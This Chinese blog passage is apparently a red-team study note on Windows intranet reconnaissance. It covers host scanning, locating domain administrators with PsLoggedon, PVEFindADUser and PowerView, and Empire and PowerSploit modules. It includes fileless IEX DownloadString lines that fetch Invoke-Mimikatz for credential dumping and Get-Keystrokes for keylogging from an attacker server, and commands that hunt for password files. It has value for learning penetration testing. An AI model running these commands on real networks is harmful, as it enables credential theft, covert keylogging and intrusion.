<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909170827618.png" alt="image-20230909170827618"></p>
<h4 id="arp-scanexe">arp-scan.exe</h4>
<p>基于arp协议来进行存活性扫描</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909171039223.png" alt="image-20230909171039223"></p>
<p>这个工具的速度比上一个快很多</p>
<h4 id="批处理脚本">批处理脚本</h4>
<p>这个批处理文件可用于对内网工作组和域内存活主机进行简单的扫描探测，并且支持中英文操作系统。</p>
<pre><code class="hljs bash">@<span class="hljs-built_in">echo</span> off
@<span class="hljs-built_in">echo</span>.
@FOR /F <span class="hljs-string">"usebackq delims=, "</span> %%J IN (`net view /domain ^|find <span class="hljs-string">"命令成功完成"</span> /v ^|find <span class="hljs-string">"The command completed successfully."</span> /v ^|find <span class="hljs-string">"命令成功完成"</span> /v ^|find <span class="hljs-string">"--"</span> /v ^|find <span class="hljs-string">"Domain"</span> /v ^|find <span class="hljs-string">""</span> /v ^|find <span class="hljs-string">"コマンドは正常に終了しました"</span> /v /i`) <span class="hljs-keyword">do</span> (
@<span class="hljs-built_in">echo</span> ====== Domain:%%J =========
@FOR /F <span class="hljs-string">"usebackq eol=; delims=, "</span> %%i <span class="hljs-keyword">in</span> (`net view /domain:%%J ^|findstr <span class="hljs-string">"\\"</span>`) <span class="hljs-keyword">do</span> (
@FOR /F <span class="hljs-string">"usebackq eol=; tokens=1,2,3* delims=\\"</span> %%a <span class="hljs-keyword">in</span> (`@<span class="hljs-built_in">echo</span> %%i`) <span class="hljs-keyword">do</span> (
ping %%a -4 -n 1 -w 100 |find /i <span class="hljs-string">"ping"</span> &gt; %%a.txt
@FOR /F <span class="hljs-string">"tokens=2 delims=[]"</span> %%b <span class="hljs-keyword">in</span> (%%a.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> \\%%a = [%%b]
@del /f /q %%a.txt
)))
@<span class="hljs-built_in">echo</span> ====== Getting IP Complete ======</code></pre>
<h4 id="msf主机存活扫描">msf主机存活扫描</h4>
<pre><code class="hljs plaintext">auxiliary/scanner/discovery/udp_sweep
auxiliary/scanner/discovery/udp_probe
auxiliary/scanner/netbios/nbname</code></pre>
<p>MSF建立会话拿到shell，即可直接执行DOS命令至今进行信息收集。也可以进行直接执行run winenum可以一键收集记录。</p>
<pre><code class="hljs plaintext">run winenum</code></pre>
<h3 id="337-定位域管理员">3.37 定位域管理员</h3>
<h4 id="psloggeddonexe">psloggeddon.exe</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
<p>psloggedon.exe可以查看本地登陆的用户和通过本地计算机或远程计算机资源登陆的用户。如果指定的是用户名而不是机器名，psloggedon.exe会搜索网上邻居中的所有计算机，并显示该用户是否已经登录。该工具的某些功能需要管理员权限。</p>
<pre><code class="hljs plaintext">psloggedon.exe [-] [-l] [-x] [\\computername或username]</code></pre>
<p>查看DC(域控)登录过的机器</p>
<pre><code class="hljs plaintext">PsLoggedon64.exe -accepteula \\DC</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909171457744.png" alt="image-20230909171457744"></p>
<p>查看本地登录的用户</p>
<pre><code class="hljs plaintext">PsLoggedon64.exe -accepteula</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909171518332.png" alt="image-20230909171518332"></p>
<p>查看指定用户登录的计算机</p>
<pre><code class="hljs plaintext">PsLoggedon64.exe -accepteula Administrator</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909171603538.png" alt="image-20230909171603538"></p>
<h4 id="pvefindaduserexe">PVEFindADUser.exe</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/">https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/</a></p>
<p>PVEFindADUser.exe 可用于查找活动目录用户登陆的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括查找本地用户。通过RDP远程桌面登陆的用户、通过运行服务和计划任务的用户。运行该工具需要计算机配置**.NET Framework 2.0 环境**，并需要有<strong>管理员权限</strong>。</p>
<pre><code class="hljs plaintext">PVEFindADUser.exe &lt;参数&gt;</code></pre>
<p>我们一般直接运行<code>PVEFindADUser.exe -current</code>命令，即可显示域中所有计算机上当前登陆的所有用户。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909175333010-1694253213828-1.png" alt="image-20230909175333010"></p>
<p>显示指定用户登录的计算机</p>
<table>
<thead>
<tr>
<th>current[“username”]</th>
<th>如果仅指定了-current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名(Domain\Username)，则显示该用户登陆的计算机</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">PVEFindADUser.exe -current redteam.org\dc
//PVEFindADUser.exe -current domain\username</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909175515361.png" alt="image-20230909175515361"></p>
<h4 id="powerviewps1">powerview.ps1</h4>
<p>powerview脚本可以用来获取当前域管理员在线登录的服务器，其依赖powershell和wmi，在powersploit工具包中，是一个收集域信息很好用的脚本。</p>
<ul>
<li>Invoke-UserHunter：**搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。**它可以使用 Get-NetSessions 和Get-NetLoggedon 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限。</li>
</ul>
<p>如下，可以看到本地域有一个域管理员：</p>
<p><code>net group "domain controllers" /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909180145971.png" alt="image-20230909180145971"></p>
<p>我们通过Invoke-UserHunter（等于Invoke-UserHunter -CheckAccess)来定位他们：</p>
<pre><code class="hljs plaintext">powershell.exe -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/powersploit/Recon/PowerView.ps1');Invoke-UserHunter</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909181558855.png" alt="image-20230909181558855"></p>
<p>详情请执行<code>Get-Help Invoke-UserHunter</code>命令查看，具体使用方法与前两个相似，它可以找到域内特定的用户群，接受用户名、用户列表和域组列表查询，接受一个主机列表或查询可用的主机域名。一切都是灵活的，让你自己定义找寻谁，在哪里找。</p>
<p>获取指定用户在线机器：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909185333858.png" alt="image-20230909185333858"></p>
<h3 id="338-empire信息收集">3.38 Empire信息收集</h3>
<pre><code class="hljs plaintext"># 查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等
usemodule situation_awareness/host/winenum
# 目标主机事件日志、应用程序控制策略日志、RDP登录信息、PowerShell脚本运行和保存的信息等，需要管理员权限
usemodule situational_awareness/host/computerdetails</code></pre>
<h3 id="339-powersploit-信息收集">3.39 powersploit 信息收集</h3>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>
，已经停止维护</p>
<p>建立会话后的meterpreter：</p>
<pre><code class="hljs powershell"><span class="hljs-comment">#加载模块</span>
load powershell
<span class="hljs-comment">#调用本地ps脚本</span>
powershell_import /usr/share/windows<span class="hljs-literal">-resources</span>/powersploit/Recon/xx.ps1
<span class="hljs-comment">#命令执行</span>
powershell_execute  <span class="hljs-built_in">Get-NetDomain</span> 
<span class="hljs-comment">#获取当前的域名称</span>
<span class="hljs-built_in">Get-NetDomain</span>  
<span class="hljs-comment">#返回所有域内成员的详细信息</span>
<span class="hljs-built_in">Get-Netuser</span> 
<span class="hljs-comment">#获取所有的域内的控制器信息</span>
<span class="hljs-built_in">Get-NetDomainController</span> 
<span class="hljs-comment">#获取所有域内机器的名称</span>
<span class="hljs-built_in">Get-NetComputer</span>  
<span class="hljs-comment">#获取域内的所有的网络共享</span>
<span class="hljs-built_in">Get-Netshare</span>
<span class="hljs-comment">#获取指定服务的远程连接信息  </span>
<span class="hljs-built_in">Get-NetRDPSESSION</span>  
<span class="hljs-comment">#获取进程的详细信息</span>
<span class="hljs-built_in">Get-NetProcess</span>  
<span class="hljs-comment"># 获取活动目录的信息</span>
<span class="hljs-built_in">Get-ADOPJECT</span> 
<span class="hljs-comment">#判断用户是否登陆计算机且用户是否有管理员权限</span>
<span class="hljs-built_in">invoke-processhunter</span></code></pre>
<p>powersploit无文件攻击<br>
将下载的文件放在vps上面。确保目标服务器可以访问：</p>
<p>如：<a target="_blank" rel="noopener" href="http://xxx.com/PowerSplot/Recon/Invoke-Portscan.ps1">http://xxx.com/PowerSplot/Recon/Invoke-Portscan.ps1</a></p>
<pre><code class="hljs plaintext">#在目标机导入脚本：
iex(new-object net.webclient).downloadstring("http://192.168.1.4/PowerSploit/Recon/Invoke-Portscan.ps1")
#扫描网段、端口
invoke-portscan -hosts 192.168.1.1/24 -ports "21,22,80,139,80,445"
#invoke-mimikatz抓取hash
iex(new-object net.webclient).downloadstring("http://192.168.1.4/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1")
#导hash
Invoke-Mimikatz -dumpcreds
#get-keystrokes键盘记录
iex(new-object net.webclient).downloadstring("http://192.168.1.4/PowerSploit/Exfiltration/Get-Keystrokes.ps1")
#将键盘记录保存到123.txt里面
Get-Keystrokes -logpath C:\Users\admin\123.txt</code></pre>
<h3 id="340-翻翻配置文件">3.40 翻翻配置文件</h3>
<p>一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件：</p>
<pre><code class="hljs plaintext">findstr  /s /m "password" *.*
findstr /s /i /m /r "defineclass remoteserver" Web目录 \*.jsp
# /r 表示正则，/s表示遍历子目录，/m表示不显示匹配</code></pre>
<p>Linux查文件：</p>
<pre><code class="hljs plaintext">find Web应用目录 -iname "*.jsp*" | xargs egrep -l -i "classloader" |xargs egrep -l -i "cipher"
find Web应用目录 -iname "*.php*" | xargs egrep -l -i "openssl_decrypt" |xargs egrep -l -i "file_get_contents"</code></pre>
<p>敏感路径</p>
<pre><code class="hljs plaintext">%WINDIR%
%WINDIR%\system32\
%TEMP%
%LOCALAPPDATA%
%APPDATA%
C:\TEMP\
C:\Windows\Temp
%UserProfile%\Downloads
%UserProfile%\Recent
C:\$Recycle.bin</code></pre>
<p>常用应用的默认配置路径：</p>
<pre><code class="hljs plaintext">Tomcat:
CATALINA_HOME/conf/tomcat-users.xml

Apache:
/etc/httpd/conf/httpd.conf

Nginx:
/etc/nginx/nginx.conf

Wdcp:
/www/wdlinux/wdcp/conf/mrpw.conf

Mysql:
mysql\data\mysql\user.MYD</code></pre>
<p>还有一些<strong>Navicat,TeamViewer,FileZilla,WinSCP,Xmangager</strong>系列产品（Xshell,Xftp)的密码查看</p>
<p>项目: <a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p>
<h3 id="341-bloodhound域分析工具">3.41 BloodHound域分析工具</h3>
<p>BloodHound通过图与线的形式，将域内用户、计算机、及相关用户等等之间的关系直观地展现在Red Team队员面前，帮助更快的梳理域内的情况。(这里先做了解)</p>
<ul>
<li>BloodHound基于Neo4j(非关系型数据库)</li>
</ul>
<h4 id="配置">配置</h4>
<ol>
<li>
<p>安装java</p>
</li>
<li>
<p>安装Neo4jServer Community</p>
<p><a target="_blank" rel="noopener" href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p>
</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909190630424.png" alt="image-20230909190630424"></p>
<p>开启服务</p>
<pre><code class="hljs plaintext">neo4j.bat console</code></pre>
<p>这里发现有点问题，就先放弃了。留个标记等日后需要拾起-  . -</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jiufang/p/16451978.html">域分析工具BloodHound使用教程 </a></p>
<h3 id="342-使用empire收集信息">3.42 使用empire收集信息</h3>
<p>在攻击机上安装empire后，使用<code>usemodule powershell/situational_awareness/host/winenum</code>即可收集相关信息，注意使用该模块需要拿到管理员权限</p>
<h2 id="四-参考文章">四、参考文章：</h2>
<p><a target="_blank" rel="noopener" href="https://hackerqwq.github.io/2021/04/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/#%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">内网渗透-信息收集篇</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7663#toc-5">内网渗透初识—信息收集1</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7663#toc-5">内网渗透初识—信息收集2</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/')">内网渗透学习-Windows信息搜集篇-持续更新</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=内网渗透学习-Windows信息搜集篇-持续更新&amp;url=http://hybcx.xyz/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>内网渗透<span class="tagsPageCount">3</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/02/badprogrammer/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">攻防世界-BadProgrammer</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/03/babyweb/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">攻防世界-babyweb</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/09/05/nei-wang-shen-tou-xue-xi-ji-chu-pian/" title="内网渗透学习-基础知识"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-09-05</div><div class="title">内网渗透学习-基础知识</div></div></a></div><div><a href="/2023/12/31/shen-tou-ce-shi-wai-wang-da-dian/" title="渗透测试流程&amp;外网打点"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-12-31</div><div class="title">渗透测试流程&amp;外网打点</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%9C%BA%E5%99%A8%E8%A7%92%E8%89%B2%E5%88%A4%E6%96%AD"><span class="toc-number">1.</span> <span class="toc-text">0x01 机器角色判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">0x02 本机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 查看主机名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 查看版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 查看所有环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E9%A9%B1%E5%8A%A8"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 查看安装驱动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 查看操作系统信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#251-%E6%9E%B6%E6%9E%84"><span class="toc-number">2.5.1.</span> <span class="toc-text">2.5.1 架构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#252-%E7%B3%BB%E7%BB%9F%E5%90%8D"><span class="toc-number">2.5.2.</span> <span class="toc-text">2.5.2 系统名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26-%E6%9F%A5%E7%9C%8B%E9%80%BB%E8%BE%91%E7%9B%98"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 查看逻辑盘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-%E6%9C%AC%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="toc-number">2.7.</span> <span class="toc-text">2.7 本机网络配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-number">2.8.</span> <span class="toc-text">2.8 查看当前系统版本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tipwmic%E5%91%BD%E4%BB%A4"><span class="toc-number">2.8.1.</span> <span class="toc-text">tip：wmic命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#29-%E6%9F%A5%E7%9C%8B%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84"><span class="toc-number">2.9.</span> <span class="toc-text">2.9 查看体系结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#210-%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8F%8A%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">2.10.</span> <span class="toc-text">2.10 查询操作系统及软件信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#211-%E6%9F%A5%E7%9C%8Bnet-framework%E7%89%88%E6%9C%AC"><span class="toc-number">2.11.</span> <span class="toc-text">2.11 查看.net framework版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#212-%E6%9F%A5%E7%9C%8B%E8%A1%A5%E4%B8%81%E5%88%97%E8%A1%A8"><span class="toc-number">2.12.</span> <span class="toc-text">2.12 查看补丁列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#213-%E6%9F%A5%E7%9C%8B%E8%A1%A5%E4%B8%81%E7%9A%84%E5%90%8D%E7%A7%B0-%E6%8F%8F%E8%BF%B0-id-%E5%AE%89%E8%A3%85%E6%97%B6%E9%97%B4%E7%AD%89"><span class="toc-number">2.13.</span> <span class="toc-text">2.13 查看补丁的名称、描述、ID、安装时间等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#214-powershell%E6%94%B6%E9%9B%86%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.14.</span> <span class="toc-text">2.14 PowerShell收集软件的版本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#215-%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%89%88%E6%9C%AC-%E8%B7%AF%E5%BE%84%E7%AD%89"><span class="toc-number">2.15.</span> <span class="toc-text">2.15 查看安装的软件的版本、路径等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#216-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">2.16.</span> <span class="toc-text">2.16 查看当前用户权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#217-%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">2.17.</span> <span class="toc-text">2.17 查询本机服务信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#218-%E6%9F%A5%E7%9C%8B%E5%BC%80%E5%90%AF%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.18.</span> <span class="toc-text">2.18 查看开启的服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#219-wmic%E6%9F%A5%E8%AF%A2%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="toc-number">2.19.</span> <span class="toc-text">2.19 wmic查询进程信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 